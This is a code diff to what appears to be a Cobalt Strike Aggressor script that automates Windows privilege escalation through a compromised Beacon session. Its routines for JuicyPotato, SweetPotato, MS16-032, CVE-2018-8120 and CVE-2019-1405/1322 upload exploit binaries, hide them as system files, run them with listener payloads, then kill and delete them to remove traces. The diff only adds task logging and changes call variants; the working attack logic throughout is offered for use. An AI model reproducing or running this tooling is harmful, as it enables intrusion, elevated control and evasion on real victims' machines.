@@ -2,6 +2,7 @@
 
 
 sub RunJuicyPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via JuicyPotato");
     local('$payload $handle $call $port $id $fname $total');
     @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
     $total = 8;
@@ -34,27 +35,29 @@ sub RunJuicyPotato{
     $handle = openf("> $+ $fname");
     writeb($handle, $payload);
     closef($handle);
-    bupload($bid, script_resource("exp/jp/jp.exe"));
-    bupload($bid, $fname);
-    bshell($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
+    bupload!($bid, script_resource("exp/jp/jp.exe"));
+    bupload!($bid, $fname);
+    bshell!($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
     exec("cmd.exe /C del /F ".$fname);
 }
 
 sub CVE_2018_8120{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2018-8120");
     local('$Rch $payload');
     $Rch = "x86";
     if (beacon_info($bid,"is64") == 1){
         $Rch = "x64";
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bupload($bid, script_resource("exp/8120/ $+ $Rch $+ .exe"));
-    bshell($bid, "attrib \"$Rch $+ .exe\" +s +h");
-    bshell($bid,"$Rch $+ .exe \"".$payload."\"");
-    bshell($bid,"taskkill /f /im $Rch $+ .exe");
-    bshell($bid,"del /F /S /Q /AH $Rch $+ .exe");
+    bupload!($bid, script_resource("exp/8120/ $+ $Rch $+ .exe"));
+    bshell!($bid, "attrib \"$Rch $+ .exe\" +s +h");
+    bshell!($bid,"$Rch $+ .exe \"".$payload."\"");
+    bshell!($bid,"taskkill /f /im $Rch $+ .exe");
+    bshell!($bid,"del /F /S /Q /AH $Rch $+ .exe");
 }
 
 sub ms16032{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via ms16-032");
     local('$Rch $payload $fname');
     @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
     $total = 8;
@@ -71,10 +74,10 @@ sub ms16032{
     $handle = openf("> $+ $fname");
     writeb($handle, $payload);
     closef($handle);
-    bupload($bid, $fname);
-    bshell($bid, "attrib \" $+ $fname\" +s +h");
-    bpowershell_import($bid, script_resource("script/MS16-032.ps1"));
-	bpowershell($bid, "Invoke-MS16-032  $+ $fname");
+    bupload!($bid, $fname);
+    bshell!($bid, "attrib \" $+ $fname\" +s +h");
+    bpowershell_import!($bid, script_resource("script/MS16-032.ps1"));
+	bpowershell!($bid, "Invoke-MS16-032  $+ $fname");
     exec("cmd.exe /C del /F ".$fname);
 }
 
@@ -95,6 +98,7 @@ sub RottenPotato{
 
 
 sub CVE_2019_1405_1322{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via CVE-2019-1405(1322)");
     local('$Rch $payload');
     $Rch = "x64";
     if (beacon_info($bid,"is64") != 1){
@@ -102,10 +106,10 @@ sub CVE_2019_1405_1322{
         return;
     }
     $payload = powershell($3['listener'], false, $Rch);
-    bupload($bid, script_resource("exp/com/1405_1322_x64.exe"));
-    bshell($bid, "attrib \"1405_1322_x64.exe\" +s +h");
-    bshell($bid,"1405_1322_x64.exe \"".$payload."\"");
-    bshell($bid,"del /F /S /Q /AH 1405_1322_x64.exe");
+    bupload!($bid, script_resource("exp/com/1405_1322_x64.exe"));
+    bshell!($bid, "attrib \"1405_1322_x64.exe\" +s +h");
+    bshell!($bid,"1405_1322_x64.exe \"".$payload."\"");
+    bshell!($bid,"del /F /S /Q /AH 1405_1322_x64.exe");
 }
 
 sub SweetPotato {
@@ -121,7 +125,7 @@ sub SweetPotato {
 	$exe = script_resource("exp/sp/sp.exe");
 	$shellcode = base64_encode(artifact_payload($3['listener'], "raw", $arch));
 	$parm = "-l 6363 "."-p $program "."-s $shellcode";
-    bexecute_assembly($bid, $exe, $parm);
+    bexecute_assembly!($bid, $exe, $parm);
 	beacon_link($bid, $null, $3['listener']);
 }
 
